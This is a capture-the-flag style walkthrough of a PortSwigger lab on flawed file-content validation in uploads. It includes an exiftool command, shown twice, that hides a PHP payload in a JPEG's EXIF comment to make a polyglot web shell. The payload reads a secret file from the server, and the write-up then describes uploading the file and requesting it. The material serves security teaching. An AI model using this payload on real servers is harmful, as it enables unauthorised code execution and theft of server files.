## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f618a2d4-80b0-462a-80b9-e00d5056a9b4)

## Overview :

**Flawed validation of the file's contents -**

Instead of implicitly trusting the Content-Type specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

Certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, **JPEG files always begin with the bytes `FF D8 FF`** 

To bypass this restriction & upload a php webshell, we can use **exiftool** to create a **polyglot webshell** .

Command - 

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
````

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/1335183d-abbc-44e2-b2e2-7f6edbd67edc)


- `comment` -> tells exiftool to inject the payload in the comment part of EXIF-metadata of the image called `flower.jpg`. It can also be injected in other fields like `document name` by providing `-documentname=`

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/0c5ee0c2-4cc3-4fb5-84f1-ab4a8078f06d)


## Solution :


Login as wiener. This time server doesn't accept any kind of files except JPG file extention. 

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/437a995d-e2a1-41d0-9265-4aba1adf755b)

It checks the **magic header** of the file to determine if it is indeed a jpg file.

So using exiftool we create a polyglot file to upload. It is a jpg file but it will have php payload in its metadata. It will get executed when the file is processed on the server side.

> Command - `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" flower.jpg -o polyglot.php`

This command will inject the php payload in the metadata of **flower.jpg** & save it in a o/p file as **polyglot.php** file.

Upload the polyglot webshell file. 

The polyglot file is successfully uploaded.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/310eefca-b0f9-4081-af95-de4ffa2e868b)

Now perform a GET request to the polyglot file to get the secret from carlos's home directory.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/02f902c2-4fa4-4d6b-9ea9-b82ce85f2a8e)

Submit the secret to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f3265201-1447-4239-8ed9-1e47b0acec14)

